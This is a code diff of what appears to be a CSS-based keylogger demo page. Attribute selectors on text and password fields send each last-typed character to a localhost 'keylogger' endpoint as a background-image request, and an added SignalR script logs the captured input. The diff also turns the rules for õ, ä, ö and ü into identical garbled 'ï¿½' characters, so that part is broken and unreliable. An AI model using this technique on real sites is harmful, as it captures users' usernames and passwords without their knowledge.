@@ -74,17 +74,17 @@
         input[type="text"][value$="w"] {
             background-image: url("http://localhost:53546/api/keylogger/user/w");
         }
-        input[type="text"][value$="õ"] {
-            background-image: url("http://localhost:53546/api/keylogger/user/õ");
+        input[type="text"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/user/ï¿½");
         }
-        input[type="text"][value$="ä"] {
-            background-image: url("http://localhost:53546/api/keylogger/user/ä");
+        input[type="text"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/user/ï¿½");
         }
-        input[type="text"][value$="ö"] {
-            background-image: url("http://localhost:53546/api/keylogger/user/ö");
+        input[type="text"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/user/ï¿½");
         }
-        input[type="text"][value$="ü"] {
-            background-image: url("http://localhost:53546/api/keylogger/user/ü");
+        input[type="text"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/user/ï¿½");
         }
         input[type="text"][value$="x"] {
             background-image: url("http://localhost:53546/api/keylogger/user/x");
@@ -162,17 +162,17 @@
         input[type="password"][value$="w"] {
             background-image: url("http://localhost:53546/api/keylogger/password/w");
         }
-        input[type="password"][value$="õ"] {
-            background-image: url("http://localhost:53546/api/keylogger/password/õ");
+        input[type="password"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/password/ï¿½");
         }
-        input[type="password"][value$="ä"] {
-            background-image: url("http://localhost:53546/api/keylogger/password/ä");
+        input[type="password"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/password/ï¿½");
         }
-        input[type="password"][value$="ö"] {
-            background-image: url("http://localhost:53546/api/keylogger/password/ö");
+        input[type="password"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/password/ï¿½");
         }
-        input[type="password"][value$="ü"] {
-            background-image: url("http://localhost:53546/api/keylogger/password/ü");
+        input[type="password"][value$="ï¿½"] {
+            background-image: url("http://localhost:53546/api/keylogger/password/ï¿½");
         }
         input[type="password"][value$="x"] {
             background-image: url("http://localhost:53546/api/keylogger/password/x");
@@ -211,6 +211,17 @@
             input.addEventListener("input", function (e) {
                 this.setAttribute("value", this.value);
             });
+        });
+    </script>
+    
+    // demo for receiving input from server
+    <script src="https://unpkg.com/jquery"></script>
+    <script src="https://unpkg.com/@aspnet/signalr-client@1.0.0-alpha2-final/dist/browser/signalr-client-1.0.0-alpha2-final.js"></script>
+    <script>
+        const connection = new signalR.HubConnection('http://localhost:53546/hub/KeyloggerListenerHub');
+        connection.start();
+        connection.on('InputReceived', (type, input) => {
+            console.log(`${type}: ${input}`);
         });
     </script>
 
